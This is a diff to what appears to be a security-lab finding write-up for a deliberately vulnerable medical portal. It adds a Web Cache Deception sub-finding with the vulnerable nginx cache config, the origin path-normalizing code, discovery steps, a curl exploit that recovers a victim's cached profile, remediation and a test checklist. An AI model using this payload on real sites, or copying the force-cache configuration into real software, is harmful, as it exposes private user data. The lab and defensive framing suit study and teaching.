@@ -5,9 +5,10 @@ category: API
 status: DONE
 severity: High
 owasp: "API8:2023 — Security Misconfiguration"
-cwe: "CWE-16 (Configuration) / CWE-436 (Interpretation Conflict) / CWE-863 (Incorrect Authorization)"
+cwe: "CWE-16 (Configuration) / CWE-436 (Interpretation Conflict) / CWE-863 (Incorrect Authorization) / CWE-524 (Use of Cache Containing Sensitive Information)"
 source_docs:
   - "stages/01_spec/output/API8-misconfig-spec.md"
+  - "stages/01_spec/output/API8-wcd-spec.md"
 affected_components:
   - cloud_api/careotter/proxy/nginx.vuln.conf
   - cloud_api/careotter/proxy/nginx.secure.conf
@@ -135,12 +136,122 @@ curl --path-as-is -s -o /dev/null -w '%{http_code}\n' "$HOST/admin/users/"   # �
 
 ---
 
+## Second interpretation conflict - Web Cache Deception (delimiter + normalization)
+
+> **Sub-finding status:** DONE (verified live 2026-08-26 - victim `MISS` caches the authenticated `/api/user/profile`, attacker `HIT` with no cookie recovers the victim's profile; `VULNERABLE=0` returns `BYPASS`/`MISS` with no leak).
+> **CWE:** CWE-436 (Interpretation Conflict) + CWE-524 (Use of Cache Containing Sensitive Information).
+
+The trailing-slash ACL bypass above is one place where the nginx edge and the gunicorn origin read the same path differently. Caching is a second one, on the same pair of servers, and it leaks a patient's private profile. A shared edge cache and the origin disagree on what `GET /static/..%2f/api/user/profile;x.css` means. The cache reads it as a static `.css` asset and stores the response. The origin reads it as the dynamic, session-authenticated `/api/user/profile` handler. So a response carrying a victim's own profile (`username`, `role`, `display_name`, `profile_photo`, `created_at`) is stored by the cache under a static key and served verbatim to the next, unauthenticated client. In a medical portal this is a patient-privacy breach: any visitor to the cached URL learns who the last authenticated patient was.
+
+`/api/user/profile` is the endpoint the patient portal already calls - `templates/profile.html` loads `static/js/profile.js`, which does `fetch('/api/user/profile')` on page load to populate the identity card. So the target is discoverable by simply browsing to `/profile` and watching the traffic, not from any inside knowledge.
+
+### The two-part discrepancy
+
+Neither layer is individually the bug. The vulnerability is the disagreement between them.
+
+**Cache side (nginx).** The production vhost caches anything whose path ends in a static extension:
+
+```nginx
+location ~* \.(?:css|js|png|jpe?g|gif|svg|ico|woff2?)$ {
+    proxy_cache wcd;
+    proxy_cache_valid 200 60s;
+    proxy_ignore_headers Set-Cookie Cache-Control Expires;   # ignore the origin's no-store: force-cache
+    proxy_hide_header Cache-Control;                          # drop the origin's contradictory no-store
+    add_header X-Cache-Status $upstream_cache_status always;
+    add_header Cache-Control "public, max-age=60" always;    # advertise the edge TTL (the poison window)
+    proxy_pass http://careotter-api:5002;                    # no URI -> raw request URI forwarded
+    # ...
+}
+```
+
+nginx normalizes `..%2f` before it chooses a location (the same normalization noted in "The vulnerability" above for `%2f`), so `/static/..%2f/api/user/profile;x.css` is matched as `/api/user/profile;x.css`, which ends in `.css` and lands in this block. The `/static/..%2f` prefix is therefore not what the cache keys on - it is the traversal the origin resolves. `proxy_ignore_headers` is the misconfiguration: it makes nginx store the response even though the origin marked it `private, no-store`. The cache key is the raw `$request_uri`, which carries no credential, so a victim and an attacker requesting the identical URL collide on one cache entry.
+
+The same block also makes the poisoning observable. The origin's `Cache-Control: no-store` is contradictory once the edge has cached the response, so nginx hides it (`proxy_hide_header`) and advertises its own freshness instead (`Cache-Control: public, max-age=60`, matching `proxy_cache_valid`). Every `MISS` and `HIT` therefore carries the poisoned entry's lifetime, so an attacker reads the 60-second window straight off the response and times the harvest before it expires (and watches `X-Cache-Status` flip back to `MISS` when it does). Without this the response would echo the origin's `no-store` and reveal nothing about how long the cache holds the victim's data.
+
+**Origin side (gunicorn).** `proxy_pass` carries no URI, so gunicorn receives the raw request line `GET /static/..%2F/api/user/profile;x.css`. A WSGI middleware in `app.py` re-derives the real route from that raw URI: it drops the `;` matrix suffix, percent-decodes (`%2f` becomes `/`), and collapses `..`.
+
+```python
+raw = environ.get('RAW_URI') or environ.get('REQUEST_URI') or environ.get('PATH_INFO', '')
+path = raw.split('?', 1)[0].split(';', 1)[0]   # ';' delimiter: drop matrix params
+environ['PATH_INFO'] = posixpath.normpath(unquote(path))   # decode %2f, collapse '..'
+```
+
+So `/static/..%2f/api/user/profile;x.css` resolves to `/api/user/profile`, which returns the caller's profile. Like the always-on `strict_slashes = False`, this normalizer is not gated by `VULNERABLE` - it is the origin behavior the attacker discovers. The toggle lives in the nginx cache policy.
+
+**Why the victim's request authenticates.** `/api/user/profile` accepts the session in either form - the `Authorization: Bearer` header the portal's JavaScript sends, OR the `careotter_token` cookie (`_decode_and_validate`). The portal's own fetch uses the Bearer header, but when the victim is lured into a top-level navigation to the crafted link, the browser attaches only the `SameSite=Lax` cookie (a Bearer header from `localStorage` is never auto-attached to a navigation). The endpoint accepting that cookie is exactly what lets the victim's request return their real profile - which the cache then stores. An endpoint that only honored the Bearer header would return `401` on the victim's click and nothing would be cached.
+
+### The mechanic
+
+| Element in the URL | Cache (nginx) reads it as | Origin (gunicorn) reads it as |
+|--------------------|---------------------------|-------------------------------|
+| `.css` suffix | static asset -> cache it | (stripped with the rest of the `;` suffix) |
+| `;x.css` | part of the filename | matrix delimiter -> dropped, leaving `/static/..%2f/api/user/profile` |
+| `..%2f` | opaque, normalized away for location choice | `../` traversal after decoding -> collapsed |
+| net path served | `/api/user/profile;x.css` (cached) | `/api/user/profile` (session-authenticated, returns the profile) |
+
+### Discovery
+
+- Browse `/profile` as a logged-in patient and capture the traffic. The page's `profile.js` fires `GET /api/user/profile`, which returns the caller's profile JSON. That is the dynamic, session-bearing endpoint to target.
+- Probe the delimiter. Requesting `/api/user/profile;anything` still returns the profile, which proves the origin treats `;` as a path delimiter and drops the suffix.
+- Probe cacheability. Appending a static extension (`/api/user/profile;x.css`) and sending the request twice shows `X-Cache-Status: MISS` then `HIT` - the dynamic response is being cached under the static key.
+- Dress the path as an asset. `/static/..%2f/api/user/profile;x.css` adds the traversal so the URL looks like a static file under `/static/`, which is what makes the victim-facing link plausible.
+
+![[api8_profile.png]]
+
+![[api8_delimiter_servers.png]]
+
+Trying to determine whether the origin server and the cache server have any discrepancies regarding the delimiters they use isn't always obvious, which is why it's a good idea to use automated attacks with tools like BurpSuite to rule out the vast majority of cases. You can find a list of delimiters on the website at [PortSwigger](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list).
+
+![[api8_intruder_payload_list.png]]
+
+It is important to disable the option that encodes URL characters.
+![[api8_encode_unselected.png]]
+
+![[api8_intruder_attack.png]]
+
+
+### Exploit - patient-profile theft via the cache
+
+**Precondition:** `VULNERABLE=1`, the stack is up with `careotter-proxy` in front, the DB is seeded (`/initialize_iot`). The victim `john_doe` is logged into the portal (holds a `careotter_token` cookie). The attacker has no account.
+
+```bash
+H=http://api.careotter.lab   # map to the proxy host via /etc/hosts
+
+# 1) The victim is lured to the attacker's link. The browser sends the SameSite=Lax cookie:
+curl -s -b v.jar --path-as-is -D - -o /dev/null \
+  "$H/static/..%2f/api/user/profile;x.css" | grep -iE 'x-cache-status|cache-control'
+#   X-Cache-Status: MISS            (now cached)
+#   Cache-Control: public, max-age=60   (the poisoned entry lives 60s)
+
+# 2) The attacker fetches the same URL with NO cookie and reads the cached body:
+curl -s --path-as-is -D - "$H/static/..%2f/api/user/profile;x.css"
+#   X-Cache-Status: HIT   Cache-Control: public, max-age=60
+#   {"profile":{"username":"john_doe","role":"patient","display_name":...,"profile_photo":...,"created_at":...}}
+```
+
+`--path-as-is` stops curl from rewriting `..%2f`. Step 1 is what the victim's click does, step 2 is the theft: the attacker now holds another patient's profile, keyed to nothing but a static-looking URL. The `Cache-Control: public, max-age=60` on both responses is the poison window - the attacker harvests within 60 seconds and re-poisons when `X-Cache-Status` flips back to `MISS`. (`display_name` / `profile_photo` are `null` until that patient sets them; `username` + `role` + `created_at` already identify them.)
+
+The victim's first request is a `MISS` that stores the profile, and the attacker's identical request with no cookie is a `HIT` that replays it - both carry `Cache-Control: public, max-age=60`.
+
+![[api8_cache_miss.png]]
+
+![[api8_cache_hit.png]]
+
+---
+
 ## Expected Result
 
 - **`VULNERABLE=1`:** `GET /api/db/info` → **403**; `GET /api/db/info/` → **200** with the real handler response (verified at the socket level). The same `403`→**not-403** flip reaches the rest of the bundle (the ACL is bypassed = the handler runs): `/initialize_iot/` → `200` (default creds on a fresh DB), `/api/db/test/` → `500` (handler reached; debug-write errors), each `/admin/*` page → `302` to login.
 - **`VULNERABLE=0`:** the canonical path **and** the trailing-slash variant both → **403**; a non-protected route (e.g. `/api/vitals`) still proxies normally (`200`).
 - **No-credential:** the bypass of `/api/db/*` and `/initialize_iot` needs no JWT/cookie — the proxy ACL was their only control.
 - **Chain (documented):** once `/admin/*` is reachable externally, an **API2** forged admin JWT (weak `careotter_jwt_2026` secret) drives the full admin panel; the ACL bypass is the network-layer enabler.
+- **WCD (`VULNERABLE=1`):** a victim request to `/static/..%2f/api/user/profile;x.css` returns `200` and populates the cache (`X-Cache-Status: MISS` then `HIT`), and an attacker request to the same URL with no cookie returns the victim's profile (`username`/`role`/`display_name`/`profile_photo`/`created_at`) from cache. Both responses carry `Cache-Control: public, max-age=60` (the origin's `no-store` is hidden), so the response itself advertises the 60-second poison window. **`VULNERABLE=0`:** the authenticated request is bypassed out of the cache (`proxy_no_cache`/`proxy_cache_bypass` on cookie/authorization), so nothing leaks.
+
+![[api8_cache_miss.png]]
+
+![[api8_cache_hit.png]]
+
+Now other authenticated users can access to `john_doe` user PII accessing to this cached file. An attacker can trick another user into accessing this address while authenticated and thereby obtain their personal information.
 
 ---
 
@@ -150,6 +261,8 @@ curl --path-as-is -s -o /dev/null -w '%{http_code}\n' "$HOST/admin/users/"   # �
 - **Make the proxy and backend agree on the path.** If the proxy must filter, match the **normalized** path the backend will route (prefix/regex covering trailing slash, `merge_slashes on`, decode-then-match) — never enumerate exact literals.
 - **Deny by default**, allow-list the few public paths, rather than block-listing the sensitive ones.
 - **Remove the unnecessary surface.** Debug endpoints (`/api/db/*`) and the plaintext default-credential `/initialize_iot` should not exist in a deployed build.
+- **Never cache a response to an authenticated request.** Key on, or bypass for, the session cookie / `Authorization` header (`proxy_no_cache $http_cookie $http_authorization`), and honor the origin's `Cache-Control: no-store` instead of overriding it with `proxy_ignore_headers`.
+- **Make the origin reject the crafted path, not normalize it.** The deeper fix is app-side: refuse `;` matrix suffixes and `..` traversal on API routes rather than silently rewriting them to a real handler. As with the trailing-slash bypass, the proxy is the wrong place to carry the security decision.
 
 ---
 
@@ -161,6 +274,8 @@ curl --path-as-is -s -o /dev/null -w '%{http_code}\n' "$HOST/admin/users/"   # �
 | Proxy | Normalized matching (prefix/regex, `merge_slashes on`, decode-then-match); deny-by-default | Close the interpretation conflict (CWE-436) |
 | Config | Align proxy and backend path semantics (`strict_slashes`); no exact-literal ACLs | Eliminate the discrepancy class (CWE-16) |
 | Attack surface | Drop debug/init endpoints from production images | Reduce what an ACL slip can reach |
+| Cache | Do not cache responses to credentialed requests (`proxy_no_cache`/`proxy_cache_bypass` on cookie/auth); honor upstream `no-store` | Close the WCD leak (CWE-524) |
+| Origin | Reject `;`/`..` on API paths instead of normalizing them into a valid route | Remove the origin half of the interpretation conflict (CWE-436) |
 
 ---
 
@@ -179,6 +294,17 @@ curl --path-as-is -s -o /dev/null -w '%{http_code}\n' "$HOST/admin/users/"   # �
       external `:5002` is served by `careotter-proxy`; internal `careotter-api:5002` works.
 - [ ] **Chain note**: `/admin/*` reached externally + an API2 forged admin cookie → the
       full admin panel renders.
+- [ ] **WCD (`VULNERABLE=1`)**: victim request to `/static/..%2f/api/user/profile;x.css` →
+      `200`, `X-Cache-Status: MISS`; repeat → `HIT`.
+- [ ] **WCD (`VULNERABLE=1`)**: attacker request (no cookie) to the same URL → `200` with
+      the victim's profile JSON in the body.
+- [ ] **WCD (`VULNERABLE=1`)**: both the `MISS` and the `HIT` carry `Cache-Control: public, max-age=60`
+      (no `no-store` echoed), so the response advertises the cache lifetime.
+- [ ] **WCD (`VULNERABLE=0`)**: attacker request to the same URL does not return a victim
+      profile (`X-Cache-Status` MISS/BYPASS, `401` body).
+- [ ] **WCD regression**: `/api/user/profile` still authenticates the portal's own Bearer
+      fetch (`200`) and rejects no-auth (`401`); `/api/db/info/` still bypasses the ACL
+      (`200`) and `/api/vitals` still proxies (`200`) with the origin normalizer active.
 
 ---
 
@@ -187,7 +313,7 @@ curl --path-as-is -s -o /dev/null -w '%{http_code}\n' "$HOST/admin/users/"   # �
 - Werkzeug debug-console RCE (debug enabled in production).
 - Expanding `/api/db/info` content to dump the user table / password hashes.
 - Clickjacking from missing `X-Frame-Options`/CSP.
-- The pre-existing verbose `handle_exception` and absent security/cache headers (baseline, not promoted here). The **CORS** angle is intentionally not used: `careotter_token` is `HttpOnly` + `SameSite=Lax` and the token also lives in origin-isolated `localStorage`, so a permissive-CORS credentialed read is not exploitable on the HTTP lab.
+- The pre-existing verbose `handle_exception` and absent security headers (baseline, not promoted here). Cache handling is no longer in this list: the cache angle is now the Web Cache Deception sub-finding above. The **CORS** angle is intentionally not used: `careotter_token` is `HttpOnly` + `SameSite=Lax` and the token also lives in origin-isolated `localStorage`, so a permissive-CORS credentialed read is not exploitable on the HTTP lab.
 
 ---
 
